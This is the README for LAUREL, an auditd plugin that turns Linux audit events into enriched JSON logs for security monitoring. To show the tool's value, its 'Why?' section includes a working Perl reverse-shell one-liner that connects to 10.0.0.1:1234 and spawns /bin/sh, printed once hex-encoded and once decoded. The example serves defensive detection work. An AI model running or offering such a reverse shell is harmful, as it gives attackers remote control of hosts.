![logo](laurel.svg)
# Linux Audit – Usable, Robust, Easy Logging

[![Build Status](https://github.com/threathunters-io/laurel/actions/workflows/build.yml/badge.svg)](https://github.com/threathunters-io/laurel/actions/workflows/build.yml)

LAUREL is an event post-processing plugin for _auditd(8)_ that generates useful, enriched JSON-based audit logs suitable for modern security monitoring setups.

Documentation corresponding to the latest stable release can be found [here](https://github.com/threathunters-io/laurel/tree/v0.5.5).

## Why?

TLDR: Instead of audit events that look like this…
```
type=EXECVE msg=audit(1626611363.720:348501): argc=3 a0="perl" a1="-e" a2=75736520536F636B65743B24693D2231302E302E302E31223B24703D313233343B736F636B65742…
```
…_LAUREL_ turns them into JSON logs where the mess that attackers/penetration testers/red teamers are trying to make becomes apparent at first glance:
```
{ … "EXECVE":{ "argc": 3,"ARGV": ["perl", "-e", "use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};"]}, …}
```
This happens at the source because _LAUREL_ runs on the host where the audit events are generated. Events are enriched with useful information about the parent process (ppid):
```
"PPID":{"EVENT_ID":"1643635026.276:327308","comm":"sh","exe":"/usr/bin/dash","ppid":3190631}
```

## Documentation

Configuration and operational details are described in the [laurel(8)](man/laurel.8.md) manual page.
Details about the log format and rationales can be found in the [laurel-about(7)](man/laurel-about.7.md) manual page. 

The [_LAUREL_ installation instructions](INSTALL.md) contain instructions on how to build _LARUEL_ from source and how to install and configure it.

We developed _LAUREL_ because we were not content with feature sets and performance characteristics of existing projects and products. Please refer to the [Performance](performance.md) document for details.

## Container Image

From v0.5.2 on laurel is able to connect to a socket for forwarded auditd messages and can be executed in a container this way. A basic container image is published in this repository to `ghcr.io/threathunters-io/laurel` with tags `latest` and the respective version tag.

The provided container image build includes default labels via docker buildx from the pipeline. These labels are not included in the provided Dockerfile but are considered good practice. If you use a custom build with another tooling, consider adding the default labels to the Dockerfile.

The provided container image contains the default configuration, with one modification: Laurel connects to `/var/run/audispd_events` (the default path specified for the `builtin_af_unix` _auditd(8)_ plug-in. The plug-in needs to be enabled and the socket must be accessible from within the container. The rest of the configuration file should be customized as needed before deploying.

## License

GNU General Public License, version 3

## Authors

- Hilko Bengen <<bengen@hilluzination.de>>
- Sergej Schmidt <<sergej@msgpeek.net>>

The logo was created by Birgit Meyer <<hello@biggi.io>>.
